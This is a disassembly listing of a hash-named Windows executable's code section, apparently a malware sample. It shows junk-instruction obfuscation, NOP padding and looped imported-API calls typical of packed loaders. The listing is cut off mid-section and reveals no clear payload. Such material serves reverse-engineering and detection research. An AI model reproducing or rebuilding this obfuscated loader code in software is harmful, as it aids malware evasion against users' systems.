
158fe3158a0a0bce57a9ac5194ee5d54eb1a409dca9b6391610be0dfd630a919.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	mov    BYTE PTR ds:0x407070,0xfe
  401007:	mov    al,ds:0x4070e1
  40100c:	sbb    DWORD PTR ds:0x407155,eax
  401012:	add    esi,eax
  401014:	adc    DWORD PTR ds:0x40705b,esi
  40101a:	mov    ecx,DWORD PTR ds:0x4071e5
  401020:	mov    BYTE PTR ds:0x407042,bh
  401026:	add    esi,edi
  401028:	mov    edx,DWORD PTR ds:0x40702a
  40102e:	mov    BYTE PTR ds:0x40713c,0xd0
  401035:	sub    DWORD PTR ds:0x4071e0,eax
  40103b:	add    ecx,eax
  40103d:	mov    DWORD PTR ds:0x407109,ecx
  401043:	xor    BYTE PTR ds:0x4070f7,cl
  401049:	sub    cl,0xb6
  40104c:	mov    BYTE PTR ds:0x40702a,0xc6
  401053:	push   0x407250
  401058:	call   DWORD PTR ds:0x405014
  40105e:	test   eax,eax
  401060:	jne    0x401000
  401062:	add    edi,ebx
  401064:	add    bl,0x9e
  401067:	and    DWORD PTR ds:0x407024,esi
  40106d:	sbb    edi,0x8
  401070:	add    edx,ebx
  401072:	xor    DWORD PTR ds:0x4070bf,eax
  401078:	mov    BYTE PTR ds:0x40702d,0x7
  40107f:	sub    ebx,edi
  401081:	sbb    DWORD PTR ds:0x40705c,esi
  401087:	add    eax,0xffffff93
  40108a:	sbb    DWORD PTR ds:0x4071ab,esi
  401090:	mov    BYTE PTR ds:0x407078,0x19
  401097:	mov    edx,DWORD PTR ds:0x407188
  40109d:	mov    edi,DWORD PTR ds:0x40715e
  4010a3:	add    ebx,eax
  4010a5:	adc    edi,0xffffffdb
  4010a8:	push   0x407259
  4010ad:	call   DWORD PTR ds:0x405000
  4010b3:	mov    BYTE PTR ds:0x407101,0x31
  4010ba:	sbb    DWORD PTR ds:0x407187,edi
  4010c0:	xor    DWORD PTR ds:0x4071b9,ebx
  4010c6:	or     DWORD PTR ds:0x407192,esi
  4010cc:	mov    BYTE PTR ds:0x4070f4,0x29
  4010d3:	mov    BYTE PTR ds:0x407049,0x1b
  4010da:	add    cl,ah
  4010dc:	mov    BYTE PTR ds:0x407137,0x34
  4010e3:	sub    DWORD PTR ds:0x407097,ecx
  4010e9:	mov    ah,BYTE PTR ds:0x4071b6
  4010ef:	adc    DWORD PTR ds:0x4070ca,esi
  4010f5:	mov    BYTE PTR ds:0x407071,0xdb
  4010fc:	mov    eax,ds:0x407078
  401101:	mov    ebx,DWORD PTR ds:0x407099
  401107:	sbb    DWORD PTR ds:0x4071f8,eax
  40110d:	mov    ecx,DWORD PTR ds:0x407050
  401113:	mov    eax,ds:0x407038
  401118:	cmp    BYTE PTR ds:0x407208,0x1
  40111f:	jb     0x401212
  401125:	nop
  401126:	nop
  401127:	nop
  401128:	nop
  401129:	nop
  40112a:	nop
  40112b:	nop
  40112c:	nop
  40112d:	nop
  40112e:	nop
  40112f:	add    eax,0xffffffa6
  401132:	or     esi,0x51
  401135:	and    DWORD PTR ds:0x407154,edi
  40113b:	mov    BYTE PTR ds:0x407019,0x50
  401142:	mov    esi,DWORD PTR ds:0x4070cc
  401148:	mov    ebx,DWORD PTR ds:0x407050
  40114e:	or     DWORD PTR ds:0x407056,eax
  401154:	or     edi,0x9
  401157:	mov    DWORD PTR ds:0x40715c,edi
  40115d:	mov    BYTE PTR ds:0x4070b5,0x4c
  401164:	sub    ah,bh
  401166:	mov    eax,ds:0x407126
  40116b:	mov    ebx,DWORD PTR ds:0x4071b0
  401171:	adc    ebx,edi
  401173:	mov    edi,DWORD PTR ds:0x40710a
  401179:	or     DWORD PTR ds:0x40715e,eax
  40117f:	or     eax,0xffffffbe
  401182:	sub    esi,0xffffffaa
  401185:	mov    BYTE PTR ds:0x407025,0x23
  40118c:	add    ebx,0xffffffca
  40118f:	push   0x407250
  401194:	call   DWORD PTR ds:0x405014
  40119a:	test   eax,eax
  40119c:	jne    0x40112f
  40119e:	mov    BYTE PTR ds:0x4070d2,0x42
  4011a5:	mov    edx,DWORD PTR ds:0x40706d
  4011ab:	mov    BYTE PTR ds:0x40705c,0x34
  4011b2:	adc    DWORD PTR ds:0x407121,edi
  4011b8:	mov    bl,BYTE PTR ds:0x40712b
  4011be:	mov    eax,ds:0x4070e7
  4011c3:	sbb    eax,0xffffffc4
  4011c6:	mov    ecx,DWORD PTR ds:0x407154
  4011cc:	mov    BYTE PTR ds:0x4071cd,0x57
  4011d3:	xor    al,al
  4011d5:	mov    BYTE PTR ds:0x4071e1,0x6c
  4011dc:	and    ah,0x87
  4011df:	mov    BYTE PTR ds:0x40700b,0xdf
  4011e6:	add    edi,edi
  4011e8:	mov    BYTE PTR ds:0x4071b4,0x2a
  4011ef:	sbb    edi,0xffffffa6
  4011f2:	sbb    eax,esi
  4011f4:	mov    esi,DWORD PTR ds:0x4071dc
  4011fa:	mov    BYTE PTR ds:0x40707f,0xb9
  401201:	cmp    BYTE PTR ds:0x407208,0x1
  401208:	jb     0x40178e
  40120e:	nop
  40120f:	nop
  401210:	nop
  401211:	nop
  401212:	mov    esp,ebp
  401214:	pop    ebp
  401215:	ret    
  401216:	add    ebx,0x60
  401219:	and    DWORD PTR ds:0x407066,esi
  40121f:	mov    BYTE PTR ds:0x407130,0x6f
  401226:	sbb    DWORD PTR ds:0x4071db,edi
  40122c:	mov    BYTE PTR ds:0x4070c2,0x42
  401233:	add    DWORD PTR ds:0x40706b,eax
  401239:	sbb    eax,0xffffffc1
  40123c:	mov    ecx,DWORD PTR ds:0x40712e
  401242:	adc    edi,0x7
  401245:	mov    esi,DWORD PTR ds:0x407167
  40124b:	mov    ds:0x407191,eax
  401250:	add    dh,bh
  401252:	mov    ebx,DWORD PTR ds:0x40716d
  401258:	sub    edi,eax
  40125a:	add    eax,edi
  40125c:	or     DWORD PTR ds:0x4071f6,edi
  401262:	mov    BYTE PTR ds:0x4071f7,0xe1
  401269:	sub    esi,eax
  40126b:	mov    esi,DWORD PTR ds:0x4071e1
  401271:	mov    BYTE PTR ds:0x407054,0xff
  401278:	push   0x407259
  40127d:	call   DWORD PTR ds:0x405000
  401283:	add    edx,0x6d
  401286:	mov    BYTE PTR ds:0x407117,0x7d
  40128d:	and    eax,0x42
  401290:	adc    edx,esi
  401292:	add    edx,0x38
  401295:	mov    esi,DWORD PTR ds:0x407135
  40129b:	xor    esi,ebx
  40129d:	add    ecx,0xffffff92
  4012a0:	sub    ebx,0x52
  4012a3:	xor    DWORD PTR ds:0x40711b,esi
  4012a9:	and    DWORD PTR ds:0x407055,ebx
  4012af:	sbb    edi,esi
  4012b1:	mov    BYTE PTR ds:0x40718b,0x2e
  4012b8:	mov    ecx,DWORD PTR ds:0x4071de
  4012be:	mov    BYTE PTR ds:0x407065,0xc3
  4012c5:	mov    ecx,DWORD PTR ds:0x40709c
  4012cb:	sbb    DWORD PTR ds:0x407024,ecx
  4012d1:	mov    eax,ds:0x407146
  4012d6:	sbb    ebx,eax
  4012d8:	push   0x407241
  4012dd:	push   0xf
  4012df:	push   0x407232
  4012e4:	push   0x407226
  4012e9:	push   0x407226
  4012ee:	call   DWORD PTR ds:0x405038
  4012f4:	cmp    eax,0x0
  4012f7:	jne    0x401caf
  4012fd:	add    edx,esi
  4012ff:	add    DWORD PTR ds:0x4071f8,esi
  401305:	mov    al,ds:0x40711e
  40130a:	sbb    eax,0x2
  40130d:	mov    dh,BYTE PTR ds:0x407013
  401313:	add    edi,esi
  401315:	xor    eax,edi
  401317:	and    DWORD PTR ds:0x4070da,ebx
  40131d:	sub    DWORD PTR ds:0x4071f1,edi
  401323:	mov    edx,DWORD PTR ds:0x407061
  401329:	add    ecx,0xffffffc7
  40132c:	sbb    ebx,0x19
  40132f:	add    edx,0x5f
  401332:	xor    ecx,edx
  401334:	sub    al,bh
  401336:	xor    ecx,ebx
  401338:	cmp    BYTE PTR ds:0x407208,0x1
  40133f:	jb     0x4041d4
  401345:	nop
  401346:	nop
  401347:	nop
  401348:	nop
  401349:	nop
  40134a:	nop
  40134b:	nop
  40134c:	nop
  40134d:	nop
  40134e:	nop
  40134f:	nop
  401350:	nop
  401351:	nop
  401352:	nop
  401353:	nop
  401354:	nop
  401355:	adc    DWORD PTR ds:0x407069,edi
  40135b:	adc    edi,esi
  40135d:	xor    DWORD PTR ds:0x407076,esi
  401363:	mov    bh,BYTE PTR ds:0x407181
  401369:	add    ah,al
  40136b:	xor    DWORD PTR ds:0x407024,ebx
  401371:	mov    BYTE PTR ds:0x407197,0xef
  401378:	mov    edi,DWORD PTR ds:0x40709d
  40137e:	mov    ecx,DWORD PTR ds:0x40709a
  401384:	mov    ecx,DWORD PTR ds:0x40707b
  40138a:	mov    edx,DWORD PTR ds:0x407040
  401390:	add    dl,al
  401392:	and    bl,0xb0
  401395:	sbb    edi,eax
  401397:	add    ecx,0xc
  40139a:	and    esi,0x69
  40139d:	and    ecx,0x64
  4013a0:	add    ecx,0xffffffb6
  4013a3:	push   0x407241
  4013a8:	push   0xf
  4013aa:	push   0x407232
  4013af:	push   0x407226
  4013b4:	push   0x407226
  4013b9:	call   DWORD PTR ds:0x405038
  4013bf:	test   eax,eax
  4013c1:	jne    0x401355
  4013c3:	xor    edi,0xffffff8f
  4013c6:	mov    esi,DWORD PTR ds:0x4070ff
  4013cc:	mov    ds:0x407079,eax
  4013d1:	sub    DWORD PTR ds:0x4071e7,eax
  4013d7:	adc    DWORD PTR ds:0x40716c,edi
  4013dd:	or     DWORD PTR ds:0x4070f4,eax
  4013e3:	mov    BYTE PTR ds:0x4071e6,0x42
  4013ea:	mov    BYTE PTR ds:0x407023,0x39
  4013f1:	adc    eax,esi
  4013f3:	mov    BYTE PTR ds:0x40717b,0x29
  4013fa:	add    edx,esi
  4013fc:	mov    BYTE PTR ds:0x4071a3,0x6d
  401403:	mov    eax,ds:0x4070df
  401408:	add    ecx,edi
  40140a:	mov    ecx,DWORD PTR ds:0x407048
  401410:	mov    ch,BYTE PTR ds:0x407069
  401416:	and    BYTE PTR ds:0x4070a6,bh
  40141c:	cmp    BYTE PTR ds:0x407208,0x1
  401423:	jb     0x4032c5
  401429:	nop
  40142a:	nop
  40142b:	nop
  40142c:	nop
  40142d:	nop
  40142e:	nop
  40142f:	nop
  401430:	nop
  401431:	nop
  401432:	mov    BYTE PTR ds:0x407081,0x71
  401439:	sub    ebx,eax
  40143b:	adc    esi,0xffffffc5
  40143e:	mov    BYTE PTR ds:0x40719b,0xc5
  401445:	mov    BYTE PTR ds:0x4070ff,0xe
  40144c:	and    DWORD PTR ds:0x4070c3,ebx
  401452:	mov    BYTE PTR ds:0x40704e,0xaf
  401459:	mov    BYTE PTR ds:0x407004,0xfd
  401460:	mov    BYTE PTR ds:0x40715a,0xf4
  401467:	sbb    DWORD PTR ds:0x4070c3,ebx
  40146d:	add    ecx,0x1e
  401470:	mov    BYTE PTR ds:0x407046,0xa1
  401477:	xor    eax,0xffffffd4
  40147a:	mov    BYTE PTR ds:0x4071cc,0x59
  401481:	and    ebx,0x20
  401484:	push   0x407259
  401489:	call   DWORD PTR ds:0x405000
  40148f:	mov    BYTE PTR ds:0x40701e,0xaf
  401496:	add    esi,edi
  401498:	sub    ebx,0x64
  40149b:	sub    DWORD PTR ds:0x407035,eax
  4014a1:	adc    DWORD PTR ds:0x4070cc,edi
  4014a7:	mov    ebx,DWORD PTR ds:0x407139
  4014ad:	add    al,0x17
  4014af:	mov    BYTE PTR ds:0x407079,0xef
  4014b6:	mov    bl,BYTE PTR ds:0x407072
  4014bc:	or     DWORD PTR ds:0x407176,esi
  4014c2:	mov    BYTE PTR ds:0x4070cd,0xf7
  4014c9:	sbb    ebx,0xc
  4014cc:	add    dh,bh
  4014ce:	sub    esi,0x4d
  4014d1:	adc    edi,edi
  4014d3:	mov    esi,DWORD PTR ds:0x407020
  4014d9:	mov    ebx,DWORD PTR ds:0x40709f
  4014df:	cmp    BYTE PTR ds:0x407208,0x1
  4014e6:	jb     0x401212
  4014ec:	nop
  4014ed:	nop
  4014ee:	nop
  4014ef:	nop
  4014f0:	nop
  4014f1:	nop
  4014f2:	nop
  4014f3:	nop
  4014f4:	nop
  4014f5:	nop
  4014f6:	nop
  4014f7:	adc    ebx,0x9
  4014fa:	xor    DWORD PTR ds:0x40711e,eax
  401500:	mov    ah,BYTE PTR ds:0x407066
  401506:	mov    BYTE PTR ds:0x407071,0x62
  40150d:	add    ecx,esi
  40150f:	add    edx,0x22
  401512:	add    eax,ebx
  401514:	mov    edi,DWORD PTR ds:0x4070b6
  40151a:	add    ecx,esi
  40151c:	add    al,0x12
  40151e:	mov    ebx,DWORD PTR ds:0x4071b7
  401524:	mov    BYTE PTR ds:0x407045,0x75
  40152b:	sbb    DWORD PTR ds:0x407088,edi
  401531:	mov    eax,ds:0x407165
  401536:	add    edi,ebx
  401538:	push   0x407259
  40153d:	call   DWORD PTR ds:0x405000
  401543:	mov    edx,DWORD PTR ds:0x40716d
  401549:	adc    DWORD PTR ds:0x4070bd,eax
  40154f:	mov    BYTE PTR ds:0x407087,0x1d
  401556:	adc    DWORD PTR ds:0x407070,eax
  40155c:	mov    BYTE PTR ds:0x4070cf,0x51
  401563:	mov    BYTE PTR ds:0x40703f,0x65
  40156a:	mov    BYTE PTR ds:0x4071c5,0xae
  401571:	sbb    esi,0xffffffd5
  401574:	mov    BYTE PTR ds:0x4071a7,0x86
  40157b:	mov    eax,ds:0x407144
  401580:	adc    DWORD PTR ds:0x407142,esi
  401586:	sbb    DWORD PTR ds:0x40710b,esi
  40158c:	sub    eax,eax
  40158e:	and    edi,0xffffff91
  401591:	adc    ebx,edi
  401593:	mov    ecx,DWORD PTR ds:0x407132
  401599:	add    ecx,0x6b
  40159c:	mov    esi,DWORD PTR ds:0x4071c5
  4015a2:	xor    ebx,0x7c
  4015a5:	push   0x407259
  4015aa:	call   DWORD PTR ds:0x405000
  4015b0:	mov    BYTE PTR ds:0x407122,0x43
  4015b7:	mov    eax,ds:0x407091
  4015bc:	sub    al,ah
  4015be:	add    dh,0x82
  4015c1:	adc    edx,ebx
  4015c3:	add    edi,eax
  4015c5:	add    ecx,0x5f
  4015c8:	and    DWORD PTR ds:0x407143,eax
  4015ce:	mov    BYTE PTR ds:0x4070e0,0x3e
  4015d5:	mov    esi,DWORD PTR ds:0x4070e6
  4015db:	sbb    DWORD PTR ds:0x40712e,edx
  4015e1:	mov    dh,BYTE PTR ds:0x4071f2
  4015e7:	sub    ebx,0x64
  4015ea:	sbb    cl,0x6b
  4015ed:	add    ecx,edi
  4015ef:	cmp    BYTE PTR ds:0x407208,0x1
  4015f6:	jb     0x401212
  4015fc:	nop
  4015fd:	nop
  4015fe:	nop
  4015ff:	nop
  401600:	nop
  401601:	nop
  401602:	or     DWORD PTR ds:0x40707b,ebx
  401608:	adc    edi,0xffffff84
  40160b:	add    ecx,esi
  40160d:	add    edx,eax
  40160f:	xor    DWORD PTR ds:0x4070d3,ebx
  401615:	sbb    esi,ecx
  401617:	mov    BYTE PTR ds:0x407137,0x6
  40161e:	or     eax,0x5f
  401621:	mov    BYTE PTR ds:0x40718f,0x82
  401628:	mov    edx,DWORD PTR ds:0x407000
  40162e:	sbb    edx,ebx
  401630:	add    cl,0xc0
  401633:	mov    ebx,DWORD PTR ds:0x4071de
  401639:	mov    ds:0x40707b,eax
  40163e:	mov    BYTE PTR ds:0x40709a,0xd5
  401645:	mov    BYTE PTR ds:0x4070a9,0x80
  40164c:	mov    cl,BYTE PTR ds:0x40700e
  401652:	add    ah,ah
  401654:	push   0x407250
  401659:	call   DWORD PTR ds:0x405014
  40165f:	test   eax,eax
  401661:	jne    0x401602
  401663:	mov    eax,ds:0x407126
  401668:	or     BYTE PTR ds:0x407091,ah
  40166e:	mov    esi,DWORD PTR ds:0x407065
  401674:	mov    BYTE PTR ds:0x4070f8,0xdc
  40167b:	sub    DWORD PTR ds:0x40704c,eax
  401681:	add    DWORD PTR ds:0x407153,edi
  401687:	add    ecx,eax
  401689:	adc    edi,0xffffff93
  40168c:	mov    BYTE PTR ds:0x407124,0x80
  401693:	mov    BYTE PTR ds:0x407152,0xe0
  40169a:	add    ecx,0xffffff90
  40169d:	add    DWORD PTR ds:0x40712c,ecx
  4016a3:	adc    ebx,0x31
  4016a6:	mov    ch,BYTE PTR ds:0x407075
  4016ac:	xor    DWORD PTR ds:0x4071c2,eax
  4016b2:	sbb    DWORD PTR ds:0x407183,esi
  4016b8:	add    edx,0x39
  4016bb:	mov    esi,DWORD PTR ds:0x407085
  4016c1:	add    edx,0xffffffbe
  4016c4:	cmp    BYTE PTR ds:0x407208,0x1
  4016cb:	jb     0x401212
  4016d1:	nop
  4016d2:	nop
  4016d3:	nop
  4016d4:	nop
  4016d5:	add    DWORD PTR ds:0x40707e,esi
  4016db:	mov    BYTE PTR ds:0x4070d9,0x76
  4016e2:	xor    edi,0xd
  4016e5:	mov    DWORD PTR ds:0x407173,edi
  4016eb:	mov    al,ds:0x4071f1
  4016f0:	sub    DWORD PTR ds:0x4071f2,esi
  4016f6:	xor    ebx,eax
  4016f8:	mov    esi,DWORD PTR ds:0x4071bb
  4016fe:	mov    BYTE PTR ds:0x4071ac,0x39
  401705:	mov    BYTE PTR ds:0x40705d,0xf
  40170c:	add    edx,edi
  40170e:	or     eax,0xffffffa9
  401711:	mov    edi,DWORD PTR ds:0x40713f
  401717:	mov    BYTE PTR ds:0x40712c,0x43
  40171e:	mov    esi,DWORD PTR ds:0x40700e
  401724:	push   0x407250
  401729:	call   DWORD PTR ds:0x405014
  40172f:	test   eax,eax
  401731:	jne    0x404034
  401737:	add    dl,ah
  401739:	mov    BYTE PTR ds:0x4070ae,0x6
  401740:	add    dl,0x1a
  401743:	add    ecx,0xffffffa3
  401746:	mov    eax,ds:0x4070a0
  40174b:	mov    BYTE PTR ds:0x4070e0,0x56
  401752:	sub    ecx,esi
  401754:	adc    edi,0xffffff95
  401757:	or     eax,0x30
  40175a:	add    edi,0xfffffff0
  40175d:	add    ebx,0x40
  401760:	xor    esi,0xa
  401763:	sub    ecx,edx
  401765:	mov    BYTE PTR ds:0x40704e,0xae
  40176c:	sub    edx,0x4b
  40176f:	adc    al,cl
  401771:	mov    al,ds:0x407150
  401776:	mov    ecx,DWORD PTR ds:0x40710d
  40177c:	cmp    BYTE PTR ds:0x407208,0x1
  401783:	jb     0x401216
  401789:	nop
  40178a:	nop
  40178b:	nop
  40178c:	nop
  40178d:	nop
  40178e:	mov    BYTE PTR ds:0x4070d1,0xc5
  401795:	add    ecx,0xffffffd0
  401798:	mov    BYTE PTR ds:0x407054,0x3d
  40179f:	adc    BYTE PTR ds:0x407180,cl
  4017a5:	or     DWORD PTR ds:0x40717c,edi
  4017ab:	sub    ecx,edi
  4017ad:	adc    al,0xc7
  4017af:	mov    al,ds:0x407074
  4017b4:	sub    DWORD PTR ds:0x4070e1,ecx
  4017ba:	and    DWORD PTR ds:0x4070f3,eax
  4017c0:	mov    ecx,DWORD PTR ds:0x40704a
  4017c6:	sbb    DWORD PTR ds:0x407079,edi
  4017cc:	and    DWORD PTR ds:0x4071c0,esi
  4017d2:	add    edx,edi
  4017d4:	adc    dl,0x31
  4017d7:	or     DWORD PTR ds:0x407109,edx
  4017dd:	mov    BYTE PTR ds:0x407050,0x99
  4017e4:	push   0x407259
  4017e9:	call   DWORD PTR ds:0x405000
  4017ef:	xor    edi,ebx
  4017f1:	add    esi,0x1d
  4017f4:	mov    ebx,DWORD PTR ds:0x407154
  4017fa:	add    BYTE PTR ds:0x407160,bh
  401800:	adc    DWORD PTR ds:0x40706f,eax
  401806:	or     DWORD PTR ds:0x4071ee,eax
  40180c:	mov    ah,BYTE PTR ds:0x4071ac
  401812:	mov    esi,DWORD PTR ds:0x4070e2
  401818:	sbb    DWORD PTR ds:0x407027,edi
  40181e:	add    esi,edi
  401820:	mov    edi,DWORD PTR ds:0x407062
  401826:	add    edx,edi
  401828:	mov    edi,DWORD PTR ds:0x407076
  40182e:	add    ecx,edx
  401830:	mov    BYTE PTR ds:0x407025,0xad
  401837:	add    ebx,0x61
  40183a:	push   0x407241
  40183f:	push   0xf
  401841:	push   0x407232
  401846:	push   0x407226
  40184b:	push   0x407226
  401850:	call   DWORD PTR ds:0x405038
  401856:	cmp    eax,0x0
  401859:	jne    0x40178e
  40185f:	mov    BYTE PTR ds:0x4071c5,0x96
  401866:	xor    ebx,0xffffff94
  401869:	adc    DWORD PTR ds:0x407160,ebx
  40186f:	sbb    edi,eax
  401871:	add    ecx,0xffffffe2
  401874:	mov    edx,DWORD PTR ds:0x407110
  40187a:	adc    eax,0xffffffa5
  40187d:	mov    ecx,DWORD PTR ds:0x40712b
  401883:	or     DWORD PTR ds:0x407172,esi
  401889:	xor    ecx,0xfffffffa
  40188c:	mov    BYTE PTR ds:0x4071d3,0xbe
  401893:	or     esi,0x8
  401896:	mov    edx,DWORD PTR ds:0x407121
  40189c:	add    bl,0x78
  40189f:	or     DWORD PTR ds:0x407018,esi
  4018a5:	sbb    DWORD PTR ds:0x4071e2,ecx
  4018ab:	cmp    BYTE PTR ds:0x407208,0x1
  4018b2:	jb     0x401212
  4018b8:	nop
  4018b9:	nop
  4018ba:	nop
  4018bb:	nop
  4018bc:	nop
  4018bd:	nop
  4018be:	nop
  4018bf:	nop
  4018c0:	nop
  4018c1:	nop
  4018c2:	nop
  4018c3:	add    edx,0xffffffe0
  4018c6:	mov    BYTE PTR ds:0x4071f7,0x9e
  4018cd:	sbb    edx,ebx
  4018cf:	adc    edi,0x7
  4018d2:	mov    ecx,DWORD PTR ds:0x40713e
  4018d8:	mov    BYTE PTR ds:0x4070fa,0x6a
  4018df:	xor    eax,0x5e
  4018e2:	mov    edx,DWORD PTR ds:0x4071bd
  4018e8:	sbb    eax,eax
  4018ea:	add    ch,dh
  4018ec:	xor    DWORD PTR ds:0x40704a,eax
  4018f2:	mov    DWORD PTR ds:0x407100,edx
  4018f8:	mov    BYTE PTR ds:0x4070c1,0xb0
  4018ff:	mov    cl,BYTE PTR ds:0x407026
  401905:	add    edx,eax
  401907:	adc    DWORD PTR ds:0x4070e2,edi
  40190d:	add    esi,eax
  40190f:	sub    BYTE PTR ds:0x40703b,al
  401915:	sbb    ebx,eax
  401917:	adc    edi,ecx
  401919:	push   0x407241
  40191e:	push   0xf
  401920:	push   0x407232
  401925:	push   0x407226
  40192a:	push   0x407226
  40192f:	call   DWORD PTR ds:0x405038
  401935:	cmp    eax,0x0
  401938:	jne    0x40112f
  40193e:	mov    DWORD PTR ds:0x407069,edi
  401944:	xor    esi,esi
  401946:	adc    edi,ebx
  401948:	and    DWORD PTR ds:0x4070f0,eax
  40194e:	xor    esi,0x20
  401951:	mov    ecx,DWORD PTR ds:0x4070f6
  401957:	mov    ebx,DWORD PTR ds:0x4070db
  40195d:	mov    esi,DWORD PTR ds:0x407116
  401963:	add    edx,esi
  401965:	and    eax,0xffffffce
  401968:	mov    BYTE PTR ds:0x407132,0x32
  40196f:	sbb    DWORD PTR ds:0x4070f8,eax
  401975:	mov    ebx,DWORD PTR ds:0x407119
  40197b:	mov    DWORD PTR ds:0x407196,ebx
  401981:	sbb    DWORD PTR ds:0x4071fb,ebx
  401987:	and    edi,0xffffffce
  40198a:	mov    ebx,DWORD PTR ds:0x407087
  401990:	mov    ah,BYTE PTR ds:0x4071b0
  401996:	cmp    BYTE PTR ds:0x407208,0x1
  40199d:	jb     0x4029b6
  4019a3:	nop
  4019a4:	add    bh,0x1
  4019a7:	and    DWORD PTR ds:0x40712d,edi
  4019ad:	mov    eax,ds:0x407078
  4019b2:	add    ecx,edi
  4019b4:	sbb    edi,0x76
  4019b7:	xor    BYTE PTR ds:0x4070df,bh
  4019bd:	xor    DWORD PTR ds:0x407157,esi
  4019c3:	xor    DWORD PTR ds:0x407079,edi
  4019c9:	mov    BYTE PTR ds:0x407106,0x4e
  4019d0:	mov    BYTE PTR ds:0x407194,0x90
  4019d7:	mov    ecx,DWORD PTR ds:0x4070d9
  4019dd:	xor    edi,esi
  4019df:	mov    edx,DWORD PTR ds:0x4070dc
  4019e5:	add    edx,eax
  4019e7:	mov    BYTE PTR ds:0x4070d1,0x9c
  4019ee:	mov    edi,DWORD PTR ds:0x407105
  4019f4:	add    ecx,0xffffffe3
  4019f7:	add    eax,0xffffffcd
  4019fa:	add    DWORD PTR ds:0x407054,eax
  401a00:	or     esi,0x7e
  401a03:	push   0x407250
  401a08:	call   DWORD PTR ds:0x405014
  401a0e:	test   eax,eax
  401a10:	jne    0x4036af
  401a16:	add    ebx,0x60
  401a19:	mov    BYTE PTR ds:0x40706d,0xd3
  401a20:	xor    al,0x80
  401a22:	add    eax,esi
  401a24:	add    edx,esi
  401a26:	mov    BYTE PTR ds:0x407005,0xe4
  401a2d:	mov    ecx,DWORD PTR ds:0x407155
  401a33:	and    DWORD PTR ds:0x4071e1,ebx
  401a39:	mov    eax,ds:0x407012
  401a3e:	add    esi,eax
  401a40:	adc    BYTE PTR ds:0x4070d6,bh
  401a46:	mov    ebx,DWORD PTR ds:0x40707f
  401a4c:	add    esi,0xffffff9c
  401a4f:	add    ecx,0xc
  401a52:	sbb    DWORD PTR ds:0x40713a,ecx
  401a58:	mov    eax,ds:0x4070f0
  401a5d:	add    edx,eax
  401a5f:	push   0x407250
  401a64:	call   DWORD PTR ds:0x405014
  401a6a:	test   eax,eax
  401a6c:	jne    0x4036af
  401a72:	add    ebx,ebx
  401a74:	add    ecx,0x43
  401a77:	add    dh,cl
  401a79:	xor    esi,0x2b
  401a7c:	mov    dh,BYTE PTR ds:0x407153
  401a82:	add    eax,ecx
  401a84:	mov    DWORD PTR ds:0x4071de,edx
  401a8a:	mov    esi,DWORD PTR ds:0x407033
  401a90:	mov    edx,DWORD PTR ds:0x4070a2
  401a96:	mov    DWORD PTR ds:0x4071f6,edi
  401a9c:	add    edx,0xa
  401a9f:	or     edx,0xffffffdd
  401aa2:	add    eax,edi
  401aa4:	or     DWORD PTR ds:0x4070c9,ecx
  401aaa:	sub    edi,ebx
  401aac:	add    eax,ebx
  401aae:	or     DWORD PTR ds:0x407029,eax
  401ab4:	mov    eax,ds:0x4071dc
  401ab9:	cmp    BYTE PTR ds:0x407208,0x1
  401ac0:	jb     0x401f92
  401ac6:	nop
  401ac7:	nop
  401ac8:	nop
  401ac9:	add    edx,edi
  401acb:	mov    BYTE PTR ds:0x4070f6,0x35
  401ad2:	mov    BYTE PTR ds:0x4070ec,0x27
  401ad9:	mov    edx,DWORD PTR ds:0x40704f
  401adf:	sub    ebx,eax
  401ae1:	and    bh,0xd7
  401ae4:	sub    ebx,0xffffff83
  401ae7:	add    ecx,0x7b
  401aea:	sbb    eax,0xffffffa1
  401aed:	add    BYTE PTR ds:0x40716f,cl
  401af3:	mov    eax,ds:0x4070b3
  401af8:	mov    ecx,DWORD PTR ds:0x407034
  401afe:	sub    esi,esi
  401b00:	mov    dh,BYTE PTR ds:0x40708f
  401b06:	sbb    BYTE PTR ds:0x407195,al
  401b0c:	xor    DWORD PTR ds:0x40706c,edx
  401b12:	mov    BYTE PTR ds:0x40701f,0x57
  401b19:	push   0x407250
  401b1e:	call   DWORD PTR ds:0x405014
  401b24:	cmp    eax,0x0
  401b27:	jne    0x401ac9
  401b29:	and    DWORD PTR ds:0x407162,eax
  401b2f:	add    edx,eax
  401b31:	sub    bl,0x3e
  401b34:	add    edx,esi
  401b36:	mov    ecx,DWORD PTR ds:0x407084
  401b3c:	add    ecx,0xfffffffd
  401b3f:	mov    BYTE PTR ds:0x407038,0xb4
  401b46:	and    edx,0xffffffee
  401b49:	and    ebx,0x5d
  401b4c:	sub    DWORD PTR ds:0x407052,ebx
  401b52:	adc    DWORD PTR ds:0x407060,ebx
  401b58:	mov    BYTE PTR ds:0x40703b,0xa1
  401b5f:	or     eax,0xfffffff8
  401b62:	and    ebx,0x31
  401b65:	mov    BYTE PTR ds:0x4071f1,0x4b
  401b6c:	xor    ebx,edx
  401b6e:	cmp    BYTE PTR ds:0x407208,0x1
  401b75:	jb     0x40410f
  401b7b:	nop
  401b7c:	nop
  401b7d:	nop
  401b7e:	nop
  401b7f:	nop
  401b80:	nop
  401b81:	nop
  401b82:	and    edi,0x72
  401b85:	sub    ebx,ebx
  401b87:	adc    eax,0xfffffff9
  401b8a:	add    ecx,esi
  401b8c:	mov    BYTE PTR ds:0x4070df,0x1d
  401b93:	add    eax,0xffffffe3
  401b96:	mov    ebx,DWORD PTR ds:0x40712a
  401b9c:	and    esi,0xffffffca
  401b9f:	mov    eax,ds:0x4070cf
  401ba4:	add    edx,ecx
  401ba6:	add    edx,0x6d
  401ba9:	sbb    esi,0xffffffa6
  401bac:	adc    edx,ebx
  401bae:	sbb    edi,0xfffffff3
  401bb1:	mov    ebx,DWORD PTR ds:0x4071ac
  401bb7:	push   0x407250
  401bbc:	call   DWORD PTR ds:0x405014
  401bc2:	cmp    eax,0x0
  401bc5:	jne    0x401b82
  401bc7:	mov    ds:0x4071c5,eax
  401bcc:	add    edx,esi
  401bce:	xor    al,0xf2
  401bd0:	sub    DWORD PTR ds:0x40704f,esi
  401bd6:	mov    DWORD PTR ds:0x4070d6,ebx
  401bdc:	mov    BYTE PTR ds:0x407138,0x53
  401be3:	add    ah,0x98
  401be6:	xor    DWORD PTR ds:0x407097,eax
  401bec:	xor    eax,0x3d
  401bef:	mov    BYTE PTR ds:0x4070e3,0xdb
  401bf6:	sbb    DWORD PTR ds:0x4071d3,esi
  401bfc:	add    ebx,edx
  401bfe:	xor    dl,ah
  401c00:	mov    esi,DWORD PTR ds:0x40712f
  401c06:	or     edx,0xffffffb5
  401c09:	mov    ah,BYTE PTR ds:0x4071b5
